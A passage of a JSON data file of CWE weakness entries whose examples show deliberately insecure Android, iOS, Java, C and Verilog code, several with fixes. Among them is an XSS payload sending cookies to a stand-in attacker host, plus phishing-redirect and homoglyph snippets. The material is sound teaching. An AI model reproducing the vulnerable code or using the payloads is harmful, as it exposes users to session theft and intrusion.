application: (bad code) Example Language: Java // Android @Override public boolean shouldOverrideUrlLoading(WebView view, String url){ if (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){ if(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){ writeDataToView(view, UserData); return false; } else{ return true; } } } (bad code) Example Language: Objective-C // iOS -(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType { NSURL *URL = [exRequest URL]; if ([[URL scheme] isEqualToString:@\"exampleScheme\"]) { NSString *functionString = [URL resourceSpecifier]; if ([functionString hasPrefix:@\"specialFunction\"]) { // Make data available back in webview. UIWebView *webView = [self writeDataToView:[URL query]]; } return NO; } return YES; } A call into native code can then be initiated by passing parameters within the URL: (attack code) Example Language: JavaScript window.location = examplescheme://method?parameter=value Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."
    },
    {
        "id": 940,
        "demonstrative_examples": "Example 1 This Android application will remove a user account when it receives an intent to do so: (bad code) Example Language: Java IntentFilter filter = new IntentFilter(\"com.example.RemoveUser\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); public class DeleteReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { int userID = intent.getIntExtra(\"userID\"); destroyUserData(userID); } } This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file. Example 2 These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application: (bad code) Example Language: Java // Android @Override public boolean shouldOverrideUrlLoading(WebView view, String url){ if (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){ if(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){ writeDataToView(view, UserData); return false; } else{ return true; } } } (bad code) Example Language: Objective-C // iOS -(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType { NSURL *URL = [exRequest URL]; if ([[URL scheme] isEqualToString:@\"exampleScheme\"]) { NSString *functionString = [URL resourceSpecifier]; if ([functionString hasPrefix:@\"specialFunction\"]) { // Make data available back in webview. UIWebView *webView = [self writeDataToView:[URL query]]; } return NO; } return YES; } A call into native code can then be initiated by passing parameters within the URL: (attack code) Example Language: JavaScript window.location = examplescheme://method?parameter=value Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."
    },
    {
        "id": 941,
        "demonstrative_examples": "Example 1 This code listens on a port for DNS requests and sends the result to the requesting address. (bad code) Example Language: Python sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.bind( (UDP_IP,UDP_PORT) ) while true: data = sock.recvfrom(1024) if not data: break (requestIP, nameToResolve) = parseUDPpacket(data) record = resolveName(nameToResolve) sendResponse(requestIP,record) \"This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.\""
    },
    {
        "id": 942,
        "demonstrative_examples": "Example 1 These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data: Flash crossdomain.xml : (bad code) Example Language: XML <cross-domain-policy xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"http://www.adobe.com/xml/schemas/PolicyFile.xsd\"> <allow-access-from domain=\"*.example.com\"/> <allow-access-from domain=\"*\"/> </cross-domain-policy> Silverlight clientaccesspolicy.xml : (bad code) Example Language: XML <?xml version=\"1.0\" encoding=\"utf-8\"?> <access-policy> <cross-domain-access> <policy> <allow-from http-request-headers=\"SOAPAction\"> <domain uri=\"*\"/> </allow-from> <grant-to> <resource path=\"/\" include-subpaths=\"true\"/> </grant-to> </policy> </cross-domain-access> </access-policy> These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it."
    },
    {
        "id": 943,
        "demonstrative_examples": ""
    },
    {
        "id": 1004,
        "demonstrative_examples": "Example 1 \"In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.\" The snippet of code below establishes a new cookie to hold the sessionID. (bad code) Example Language: Java String sessionID = generateSessionId(); Cookie c = new Cookie(\"session_id\", sessionID); response.addCookie(c); The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as: (attack code) Example Language: JavaScript document.write(\\'<img src=\"http://attacker.example.com/collect-cookies?cookie=\\' + document.cookie . \\'\">\\ When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie. To mitigate the risk, use the setHttpOnly(true) method. (good code) Example Language: Java String sessionID = generateSessionId(); Cookie c = new Cookie(\"session_id\", sessionID); c.setHttpOnly(true); response.addCookie(c);"
    },
    {
        "id": 1007,
        "demonstrative_examples": "Example 1 The following looks like a simple, trusted URL that a user may frequently access. (attack code) http://www.\u00d0\u00b5x\u00d0\u00b0m\u00d1\\x80l\u00d0\u00b5.\u00d1\\x81\u00d0\u00bem However, the URL above is comprised of Cyrillic characters that look identical to the expected ASCII characters. This results in most users not being able to distinguish between the two and assuming that the above URL is trusted and safe. The \"e\" is actually the \"CYRILLIC SMALL LETTER IE\" which is represented in HTML as the character &#x0435, while the \"a\" is actually the \"CYRILLIC SMALL LETTER A\" which is represented in HTML as the character &#x0430.  The \"p\", \"c\", and \"o\" are also Cyrillic characters in this example. Viewing the source reveals a URL of \"http://www.&#x0435;x&#x0430;m&#x0440;l&#x0435;.&#x0441;&#x043e;m\". An adversary can utilize this approach to perform an attack such as a phishing attack in order to drive traffic to a malicious website. Example 2 The following displays an example of how creating usernames containing homoglyphs can lead to log forgery. Assume an adversary visits a legitimate, trusted domain and creates the account \"admin\" where the \\'a\\' and \\'i\\' characters are Cyrillic characters instead of the expected ACII. Any actions the adversary performs will be saved to the log file and look like they came from a legitimate administrator account. (result) 123.123.123.123 \u00d0\u00b0dm\u00d1\\x96n [17/Jul/2017:09:05:49 -0400] \"GET /example/users/userlist HTTP/1.1\" 401 12846 123.123.123.123 \u00d0\u00b0dm\u00d1\\x96n [17/Jul/2017:09:06:51 -0400] \"GET /example/users/userlist HTTP/1.1\" 200 4523 123.123.123.123 \u00d0\u00b0dm\u00d1\\x96n [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291 123.123.123.123 \u00d0\u00b0dm\u00d1\\x96n [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291 123.123.123.123 \u00d0\u00b0dm\u00d1\\x96n [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291 123.123.123.123 \u00d0\u00b0dm\u00d1\\x96n [17/Jul/2017:09:10:02 -0400] \"GET /example/users/editusers HTTP/1.1\" 200 6291 However, upon closer inspection, the account that generated these log entries is \"&#x0430;dm&#x0456;n\". This makes it more difficult to determine which actions were performed by the adversary and which actions were executed by the legitimate \"admin\" account."
    },
    {
        "id": 1021,
        "demonstrative_examples": ""
    },
    {
        "id": 1022,
        "demonstrative_examples": "Example 1 \"In this example, the application opens a link in a named window/tab without taking precautions to prevent the called page from tampering with the calling page's location in the browser.\" There are two ways that this weakness is commonly seen. The first is when the application generates an <a> tag is with target=\"_blank\" to point to a target site: (bad code) Example Language: HTML <a href=\"http://attacker-site.example.com/useful-page.html\" target=\"_blank\"> \"If the attacker offers a useful page on this link (or compromises a trusted, popular site), then a user may click on this link.  However, the attacker could use scripting code to modify the window.opener's location property to redirect the application to a malicious, attacker-controlled page - such as one that mimics the look and feel of the original application and convinces the user to re-enter authentication credentials, i.e. phishing:\" (attack code) Example Language: JavaScript \"window.opener.location = 'http://phishing.example.org/popular-bank-page';\" To mitigate this type of weakness, some browsers support the \"rel\" attribute with a value of \"noopener\", which sets the window.opener object equal to null. Another option is to use the \"rel\" attribute with a value of \"noreferrer\", which in essence does the same thing. (good code) Example Language: HTML <a href=\"http://attacker-site.example.com/useful-page.html\" target=\"_blank\" rel=\"noopener noreferrer\"> A second way that this weakness is commonly seen is when opening a new site directly within JavaScript. In this case, a new site is opened using the window.open() function. (bad code) Example Language: JavaScript var newWindow = window.open(\"http://attacker-site.example.com/useful-page.html\", \"_blank\"); To mitigate this, set the window.opener object to null. (good code) Example Language: JavaScript var newWindow = window.open(\"http://attacker-site.example.com/useful-page.html\", \"_blank\"); newWindow.opener = null;"
    },
    {
        "id": 1023,
        "demonstrative_examples": "Example 1 Consider an application in which Truck objects are defined to be the same if they have the same make, the same model, and were manufactured in the same year. (bad code) Example Language: Java public class Truck { private String make; private String model; private int year; public boolean equals(Object o) { if (o == null) return false; if (o == this) return true; if (!(o instanceof Truck)) return false; Truck t = (Truck) o; return (this.make.equals(t.getMake()) && this.model.equals(t.getModel())); } } Here, the equals() method only checks the make and model of the Truck objects, but the year of manufacture is not included. Example 2 This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded. (bad code) Example Language: C /* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */ char *username = \"admin\"; char *pass = \"password\"; int AuthenticateUser(char *inUser, char *inPass) { if (strncmp(username, inUser, strlen(inUser))) { logEvent(\"Auth failure of username using strlen of inUser\"); return(AUTH_FAIL); } if (! strncmp(pass, inPass, strlen(inPass))) { logEvent(\"Auth success of password using strlen of inUser\"); return(AUTH_SUCCESS); } else { logEvent(\"Auth fail of password using sizeof\"); return(AUTH_FAIL); } } int main (int argc, char **argv) { int authResult; if (argc < 3) { ExitError(\"Usage: Provide a username and password\"); } authResult = AuthenticateUser(argv[1], argv[2]); if (authResult == AUTH_SUCCESS) { DoAuthenticatedTask(argv[1]); } else { ExitError(\"Authentication failed\"); } } \"In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success.\" As a result, this partial comparison leads to improper authentication ( CWE-287 ). Any of these passwords would still cause authentication to succeed for the \"admin\" user: (attack code) p pa pas pass This significantly reduces the search space for an attacker, making brute force attacks more feasible. The same problem also applies to the username, so values such as \"a\" and \"adm\" will succeed for the username. While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness."
    },
    {
        "id": 1024,
        "demonstrative_examples": ""
    },
    {
        "id": 1025,
        "demonstrative_examples": "Example 1 In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent. (bad code) Example Language: Java String str1 = new String(\"Hello\"); String str2 = new String(\"Hello\"); if (str1 == str2) { System.out.println(\"str1 == str2\"); } However, the if statement will not be executed as the strings are compared using the \"==\" operator. For Java objects, such as String objects, the \"==\" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method: (good code) if (str1.equals(str2)) { System.out.println(\"str1 equals str2\"); }"
    },
    {
        "id": 1037,
        "demonstrative_examples": ""
    },
    {
        "id": 1038,
        "demonstrative_examples": ""
    },
    {
        "id": 1039,
        "demonstrative_examples": ""
    },
    {
        "id": 1041,
        "demonstrative_examples": ""
    },
    {
        "id": 1042,
        "demonstrative_examples": ""
    },
    {
        "id": 1043,
        "demonstrative_examples": ""
    },
    {
        "id": 1044,
        "demonstrative_examples": ""
    },
    {
        "id": 1045,
        "demonstrative_examples": ""
    },
    {
        "id": 1046,
        "demonstrative_examples": ""
    },
    {
        "id": 1047,
        "demonstrative_examples": ""
    },
    {
        "id": 1048,
        "demonstrative_examples": ""
    },
    {
        "id": 1049,
        "demonstrative_examples": ""
    },
    {
        "id": 1050,
        "demonstrative_examples": ""
    },
    {
        "id": 1051,
        "demonstrative_examples": ""
    },
    {
        "id": 1052,
        "demonstrative_examples": ""
    },
    {
        "id": 1053,
        "demonstrative_examples": ""
    },
    {
        "id": 1054,
        "demonstrative_examples": ""
    },
    {
        "id": 1055,
        "demonstrative_examples": ""
    },
    {
        "id": 1056,
        "demonstrative_examples": ""
    },
    {
        "id": 1057,
        "demonstrative_examples": ""
    },
    {
        "id": 1058,
        "demonstrative_examples": ""
    },
    {
        "id": 1059,
        "demonstrative_examples": ""
    },
    {
        "id": 1060,
        "demonstrative_examples": ""
    },
    {
        "id": 1061,
        "demonstrative_examples": ""
    },
    {
        "id": 1062,
        "demonstrative_examples": ""
    },
    {
        "id": 1063,
        "demonstrative_examples": ""
    },
    {
        "id": 1064,
        "demonstrative_examples": ""
    },
    {
        "id": 1065,
        "demonstrative_examples": ""
    },
    {
        "id": 1066,
        "demonstrative_examples": ""
    },
    {
        "id": 1067,
        "demonstrative_examples": ""
    },
    {
        "id": 1068,
        "demonstrative_examples": ""
    },
    {
        "id": 1069,
        "demonstrative_examples": ""
    },
    {
        "id": 1070,
        "demonstrative_examples": ""
    },
    {
        "id": 1071,
        "demonstrative_examples": ""
    },
    {
        "id": 1072,
        "demonstrative_examples": ""
    },
    {
        "id": 1073,
        "demonstrative_examples": ""
    },
    {
        "id": 1074,
        "demonstrative_examples": ""
    },
    {
        "id": 1075,
        "demonstrative_examples": ""
    },
    {
        "id": 1076,
        "demonstrative_examples": ""
    },
    {
        "id": 1077,
        "demonstrative_examples": ""
    },
    {
        "id": 1078,
        "demonstrative_examples": ""
    },
    {
        "id": 1079,
        "demonstrative_examples": ""
    },
    {
        "id": 1080,
        "demonstrative_examples": ""
    },
    {
        "id": 1082,
        "demonstrative_examples": ""
    },
    {
        "id": 1083,
        "demonstrative_examples": ""
    },
    {
        "id": 1084,
        "demonstrative_examples": ""
    },
    {
        "id": 1085,
        "demonstrative_examples": ""
    },
    {
        "id": 1086,
        "demonstrative_examples": ""
    },
    {
        "id": 1087,
        "demonstrative_examples": ""
    },
    {
        "id": 1088,
        "demonstrative_examples": ""
    },
    {
        "id": 1089,
        "demonstrative_examples": ""
    },
    {
        "id": 1090,
        "demonstrative_examples": ""
    },
    {
        "id": 1091,
        "demonstrative_examples": ""
    },
    {
        "id": 1092,
        "demonstrative_examples": ""
    },
    {
        "id": 1093,
        "demonstrative_examples": ""
    },
    {
        "id": 1094,
        "demonstrative_examples": ""
    },
    {
        "id": 1095,
        "demonstrative_examples": ""
    },
    {
        "id": 1096,
        "demonstrative_examples": ""
    },
    {
        "id": 1097,
        "demonstrative_examples": ""
    },
    {
        "id": 1098,
        "demonstrative_examples": ""
    },
    {
        "id": 1099,
        "demonstrative_examples": ""
    },
    {
        "id": 1100,
        "demonstrative_examples": ""
    },
    {
        "id": 1101,
        "demonstrative_examples": ""
    },
    {
        "id": 1102,
        "demonstrative_examples": ""
    },
    {
        "id": 1103,
        "demonstrative_examples": ""
    },
    {
        "id": 1104,
        "demonstrative_examples": ""
    },
    {
        "id": 1105,
        "demonstrative_examples": ""
    },
    {
        "id": 1106,
        "demonstrative_examples": ""
    },
    {
        "id": 1107,
        "demonstrative_examples": ""
    },
    {
        "id": 1108,
        "demonstrative_examples": ""
    },
    {
        "id": 1109,
        "demonstrative_examples": ""
    },
    {
        "id": 1110,
        "demonstrative_examples": ""
    },
    {
        "id": 1111,
        "demonstrative_examples": ""
    },
    {
        "id": 1112,
        "demonstrative_examples": ""
    },
    {
        "id": 1113,
        "demonstrative_examples": ""
    },
    {
        "id": 1114,
        "demonstrative_examples": ""
    },
    {
        "id": 1115,
        "demonstrative_examples": ""
    },
    {
        "id": 1116,
        "demonstrative_examples": ""
    },
    {
        "id": 1117,
        "demonstrative_examples": ""
    },
    {
        "id": 1118,
        "demonstrative_examples": ""
    },
    {
        "id": 1119,
        "demonstrative_examples": ""
    },
    {
        "id": 1120,
        "demonstrative_examples": ""
    },
    {
        "id": 1121,
        "demonstrative_examples": ""
    },
    {
        "id": 1122,
        "demonstrative_examples": ""
    },
    {
        "id": 1123,
        "demonstrative_examples": ""
    },
    {
        "id": 1124,
        "demonstrative_examples": ""
    },
    {
        "id": 1125,
        "demonstrative_examples": ""
    },
    {
        "id": 1126,
        "demonstrative_examples": ""
    },
    {
        "id": 1127,
        "demonstrative_examples": ""
    },
    {
        "id": 1164,
        "demonstrative_examples": ""
    },
    {
        "id": 1173,
        "demonstrative_examples": ""
    },
    {
        "id": 1174,
        "demonstrative_examples": ""
    },
    {
        "id": 1176,
        "demonstrative_examples": ""
    },
    {
        "id": 1177,
        "demonstrative_examples": ""
    },
    {
        "id": 1188,
        "demonstrative_examples": ""
    },
    {
        "id": 1189,
        "demonstrative_examples": ""
    },
    {
        "id": 1190,
        "demonstrative_examples": ""
    },
    {
        "id": 1191,
        "demonstrative_examples": "Example 1 A home, WiFi-router device implements a login prompt which prevents an unauthorized user from issuing any commands on the device until appropriate credentials are provided. The credentials are protected on the device and are checked for strength against attack. (bad code) Example Language: Other If the JTAG interface on this device is not hidden by the manufacturer, the interface may be identified using tools such as JTAGulator. If it is hidden but not disabled, it can be exposed by physically wiring to the board. By issuing a halt command before the OS starts, the unauthorized user pauses the watchdog timer and prevents the router from restarting (once the watchdog timer would have expired). Having paused the router, an unauthorized user is able to execute code and inspect and modify data in the device even extracting all of the routers firmware. This allows the user to examine the router and potentially take over the router. JTAG is useful to chip and device manufacturers during design, testing, and production and is included in nearly every product. Without proper authentication and authorization, the interface may allow tampering with a product. (good code) Example Language: Other In order to prevent exposing the debugging interface, manufacturers might try to obfuscate JTAG interface or blow device internal fuses to disable the JTAG interface. Adding authentication and authorization to this interface makes use by unauthorized individuals much more difficult.."
    },
    {
        "id": 1192,
        "demonstrative_examples": ""
    },
    {
        "id": 1193,
        "demonstrative_examples": ""
    },
    {
        "id": 1204,
        "demonstrative_examples": "Example 1 In the following examples, CBC mode is used when encrypting data: (bad code) Example Language: C EVP_CIPHER_CTX ctx; char key[EVP_MAX_KEY_LENGTH]; char iv[EVP_MAX_IV_LENGTH]; RAND_bytes(key, b); memset(iv,0,EVP_MAX_IV_LENGTH); EVP_EncryptInit(&ctx,EVP_bf_cbc(), key,iv); (bad code) Example Language: Java public class SymmetricCipherTest { public static void main() { byte[] text =\"Secret\".getBytes(); byte[] iv ={ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }; KeyGenerator kg = KeyGenerator.getInstance(\"DES\"); kg.init(56); SecretKey key = kg.generateKey(); Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\"); IvParameterSpec ips = new IvParameterSpec(iv); cipher.init(Cipher.ENCRYPT_MODE, key, ips); return cipher.doFinal(inpBytes); } } In both of these examples, the initialization vector (IV) is always a block of zeros. This makes the resulting cipher text much more predictable and susceptible to a dictionary attack. Example 2 The Wired Equivalent Privacy (WEP) protocol used in the 802.11 wireless standard only supported 40-bit keys, and the IVs were only 24 bits, increasing the chances that the same IV would be reused for multiple messages. The IV was included in plaintext as part of the packet, making it directly observable to attackers. Only 5000 messages are needed before a collision occurs due to the \"birthday paradox\" [ REF-1176 ]. Some implementations would reuse the same IV for each packet. This IV reuse made it much easier for attackers to recover plaintext from two packets with the same IV, using well-understood attacks, especially if the plaintext was known for one of the packets [ REF-1175 ]."
    },
    {
        "id": 1209,
        "demonstrative_examples": "Example 1 An adversary may perform writes to reserve space in hopes to change the behavior of the hardware. (bad code) Example Language: Other // Assume an IP has address space 0x0-0x0F for its configuration registers, with the last one labeled reserved (i.e. 0x0F).  Therefore inside the Finite State Machine (FSM), the code is as follows: reg gpio_out = 0;  //gpio should remain low for normal operation case (register_address) \"4'b1111 : //0x0F\" begin gpio_out = 1; end In the code above, the GPIO pin should remain low for normal operation.  However, it can be asserted by accessing the reserved address space (0x0F).  This may be a concern if the GPIO state is being used as an indicator of health (e.g. if asserted the hardware may respond by shutting down or resetting the system which may not be the correct action the system should perform). (informative) reg gpio_out = 0;  //gpio should remain low for normal operation case (register_address) \"//4'b1111 : //0x0F\" default: gpio_out = gpio_out;"
    },
    {
        "id": 1220,
        "demonstrative_examples": "Example 1 Consider a system with a register for storing AES key for encryption or decryption. The key is 128 bits, implemented as a set of four 32-bit registers. The key registers are assets and registers, AES_KEY_READ_POLICY and AES_KEY_WRITE_POLICY, and are defined to provide necessary access controls. The read-policy register defines which agents can read the AES-key registers, and write-policy register defines which agents can program or write to those registers. Each register is a 32-bit register, and it can support access control for a maximum of 32 agents. The number of the bit when set (i.e., \"1\") allows respective action from an agent whose identity matches the number of the bit and, if \"0\" (i.e., Clear), disallows the respective action to that corresponding agent. (bad code) Example Language: Other Register Field description AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_4 AES key [96:127] for encryption or decryption Default 0x00000000 AES_KEY_READ_WRITE_POLICY [31:0] Default 0x00000006 - meaning agent with identities \"1\" and \"2\" can both read from and write to key registers In the above example, there is only one policy register that controls access to both read and write accesses to the AES-key registers, and thus the design is not granular enough to separate read and writes access for different agents. Here, agent with identities \"1\" and \"2\" can both read and write. A good design should be granular enough to provide separate access controls to separate actions. Access control for reads should be separate from writes. Below is an example of such implementation where two policy registers are defined for each of these actions. The policy is defined such that: the AES-key registers can only be read or used by a crypto agent with identity \"1\" when bit #1 is set. The AES-key registers can only be programmed by a trusted firmware with identity \"2\" when bit #2 is set. (mitigation) AES_KEY_READ_POLICY [31:0] Default 0x00000002 - meaning only Crypto engine with identity \"1\" can read registers: AES_ENC_DEC_KEY_0, AES_ENC_DEC_KEY_1, AES_ENC_DEC_KEY_2, AES_ENC_DEC_KEY_3 AES_KEY_WRITE_POLICY [31:0] Default 0x00000004 - meaning only trusted firmware with identity \"2\" can program registers: AES_ENC_DEC_KEY_0, AES_ENC_DEC_KEY_1, AES_ENC_DEC_KEY_2, AES_ENC_DEC_KEY_3"
    },
    {
        "id": 1221,
        "demonstrative_examples": "Example 1 Consider example design module system verilog code shown below.register_example module is an example parameterized module that defines two parameters, REGISTER_WIDTH and REGISTER_DEFAULT. Register_example module defines a Secure_mode setting, which when set makes the register content read-only and not modifiable by software writes. register_top module instantiates two registers, Insecure_Device_ID_1 and Insecure_Device_ID_2. Generally, registers containing device identifier values are required to be read only to prevent any possibility of software modifying these values. (bad code) Example Language: Verilog // Parameterized Register module example // Secure_mode : REGISTER_DEFAULT[0] : When set to 1 register is read only and not writable// /module register_example s#( parameter REGISTER_WIDTH = 8, // Parameter defines width of register, default 8 bits parameter [REGISTER_WIDTH-1:0] REGISTER_DEFAULT = 2**REGISTER_WIDTH -2 // Default value of register computed from Width. Sets all bits to 1s except bit 0 (Secure _mode) ) ( input [REGISTER_WIDTH-1:0] Data_in, input Clk, input resetn, input write, output reg [REGISTER_WIDTH-1:0] Data_out ); reg Secure_mode; always @(posedge Clk or negedge resetn) if (~resetn) begin Data_out <= REGISTER_DEFAULT; // Register content set to Default at reset Secure_mode <= REGISTER_DEFAULT[0]; // Register Secure_mode set at reset end else if (write & ~Secure_mode) begin Data_out <= Data_in; end endmodule module register_top ( input Clk, input resetn, input write, input [31:0] Data_in, output reg [31:0] Secure_reg, output reg [31:0] Insecure_reg ); register_example #( .REGISTER_WIDTH (32), .REGISTER_DEFAULT (1224) // Incorrect Default value used bit 0 is 0. ) Insecure_Device_ID_1 ( .Data_in (Data_in), .Data_out (Secure_reg), .Clk (Clk), .resetn (resetn), .write (write) ); register_example #( .REGISTER_WIDTH (32) // Default not defined 2^32-2 value will be used as default. ) Insecure_Device_ID_2 ( .Data_in (Data_in), .Data_out (Insecure_reg), .Clk (Clk), .resetn (resetn), .write (write) ); endmodule These example instantiations show how, in a hardware design, it would be possible to instantiate the register module with insecure defaults and parameters. In the example design, both registers will be software writable since Secure_mode is defined as zero. (informative) register_example #( .REGISTER_WIDTH (32), .REGISTER_DEFAULT (1225) // Correct default value set, to enable Secure_mode ) Secure_Device_ID_example ( .Data_in (Data_in), .Data_out (Secure_reg), .Clk (Clk), .resetn (resetn), .write (write) );"
    },
    {
        "id": 1222,
        "demonstrative_examples": "Example 1 For example, consider a hardware unit with a 32 kilobyte configuration address space where the first 8 kilobyte address contains security sensitive controls that must only be writable by device bootloader. One way to protect the security configuration could be to define a 32 bit system configuration locking register (SYS_LOCK) where each bit lock locks the corresponding 1 kilobyte region. (bad code) Example Language: Other Address Register 0x0000 SYS_LOCK: 32 bit system configuration lock register, each bit is write-1-once 0x0004 SECURITY_FEATURE_ENABLE: 32 bit register controlling enabling of security features ... 0x0310 SW_MODE: 32 bit Software Mode indication register Address region Lock bit 0x0000 - 0x03FF SYS_LOCK[0] 0x0400 - 0x07FF SYS_LOCK[1] ... 0x7C00 - 0x7FFF SYS_LOCK[31] If a register exists within the first kilobyte address range (e.g. SW_MODE, address 0x310) and needs to be software writable at runtime, then this register cannot be written in a securely configured system since SYS_LOCK register lock bit 0 must be set to protect other security settings (e.g. SECURITY_FEATURE_ENABLE, address 0x0004). The only fix would be to change the hardware logic or not set the security lock bit."
    },
    {
        "id": 1223,
        "demonstrative_examples": "Example 1 consider the example design module system verilog code shown below. register_write_once_example module is an example of register that has a write-once field defined. Bit 0 field captures the write_once_status value. (bad code) Example Language: Verilog module register_write_once_example ( input [15:0] Data_in, input Clk, input ip_resetn, input global_resetn, input write, output reg [15:0] Data_out ); reg Write_once_status; always @(posedge Clk or negedge ip_resetn) if (~ip_resetn) begin \"Data_out <= 16'h0000;\" \"Write_once_status <= 1'b0;\" end else if (write & ~Write_once_status) begin \"Data_out <= Data_in & 16'hFFFE; // Input data written to register after masking bit 0\" \"Write_once_status <= 1'b1; // Write once status set after first write.\" end else if (~write) begin Data_out[15:1] <= Data_out[15:1]; Data_out[0] <= Write_once_status; end endmodule The first system component that sends a write cycle to this register can program the value. This could result in a race condition security issue in SoC design, if an untrusted agent is running in the system in parallel with the trusted component that is expected to program the register. (informative) Trusted firmware or software trying to set the write-once field. - Must confirm the Write_once_status (bit 0) value is zero, before programming register. If another agent has programmed the register before, then Write_once_status value will be one. - After writing to the register, the trusted software can issue a read to confirm that the valid setting has been programmed."
    },
    {
        "id": 1224,
        "demonstrative_examples": "Example 1 Consider the example design module system verilog code shown below. register_write_once_example module is an example of register that has a write-once field defined. Bit 0 field captures the write_once_status value. This implementation can be for a register that is defined by specification to be a write-once register, since the write_once_status field gets written by input data bit 0 on first write. (bad code) Example Language: Verilog module register_write_once_example ( input [15:0] Data_in, input Clk, input ip_resetn, input global_resetn, input write, output reg [15:0] Data_out ); reg Write_once_status; always @(posedge Clk or negedge ip_resetn) if (~ip_resetn) begin \"Data_out <= 16'h0000;\" \"Write_once_status <= 1'b0;\" end else if (write & ~Write_once_status) begin \"Data_out <= Data_in & 16'hFFFE;\" Write_once_status <= Data_in[0]; // Input bit 0 sets Write_once_status end else if (~write) begin Data_out[15:1] <= Data_out[15:1]; Data_out[0] <= Write_once_status; end endmodule The above example only locks further writes if write_once_status bit is written to one. So it acts as write_1-Once instead of the write-once attribute. (informative) module register_write_once_example ( input [15:0] Data_in, input Clk, input ip_resetn, input global_resetn, input write, output reg [15:0] Data_out ); reg Write_once_status; always @(posedge Clk or negedge ip_resetn) if (~ip_resetn) begin \"Data_out <= 16'h0000;\" \"Write_once_status <= 1'b0;\" end else if (write & ~Write_once_status) begin \"Data_out <= Data_in & 16'hFFFE;\" \"Write_once_status <= 1'b1; // Write once status set on first write, independent of input\" end else if (~write) begin Data_out[15:1] <= Data_out[15:1]; Data_out[0] <= Write_once_status; end endmodule"
    },
    {
        "id": 1229,
        "demonstrative_examples": ""
    },
    {
        "id": 1230,
        "demonstrative_examples": ""
    },
    {
        "id": 1231,
        "demonstrative_examples": "Example 1 Consider the example design below or a digital thermal sensor used in the design to detect overheating of the silicon and trigger system shutdown. The system critical temperature limit (CRITICAL_TEMP_LIMIT) and thermal sensor calibration (TEMP_SENSOR_CALIB) data have to be programmed by firmware and then the register needs to be locked (TEMP_SENSOR_LOCK). (bad code) Example Language: Other Register Field description CRITICAL_TEMP_LIMIT [31:8] Reserved field; Read only; Default 0 [7:0] Critical temp 0-255 Centigrade; Read-write-lock; Default 125 TEMP_SENSOR_CALIB [31:0] Thermal sensor calibration data. Slope value used to map sensor reading to degree Centigrade. TEMP_SENSOR_LOCK [31:1] Reserved field; Read only; Default 0 [0] Lock bit, locks CRITICAL_TEMP_LIMIT and TEMP_SENSOR_CALIB registers; Write-1-once; Default 0 TEMP_HW_SHUTDOWN [31:2] Reserved field; Read only; Default 0 [1] Enable hardware shutdown on critical temperature detection; Read-write; Default 0 CURRENT_TEMP [31:8] Reserved field; Read only; Default 0 [7:0] Current Temp 0-255 Centigrade; Read-only; Default 0 In this example note that the response of the system if the system heats to critical temperature is controlled by TEMP_HW_SHUTDOWN bit [1], which is not lockable. Thus, the intended security property of the critical temperature sensor cannot be fully protected,since software can misconfigure the TEMP_HW_SHUTDOWN register even after the lock bit is set to disable the shutdown response. (mitigation) Change TEMP_HW_SHUTDOWN field to be locked by TEMP_SENSOR_LOCK. TEMP_HW_SHUTDOWN [31:2] Reserved field; Read only; Default 0 [1] Enable hardware shutdown on critical temperature detection; Read-write-Lock; Default 0 [0] Locked by TEMP_SENSOR_LOCK"
    },
    {
        "id": 1232,
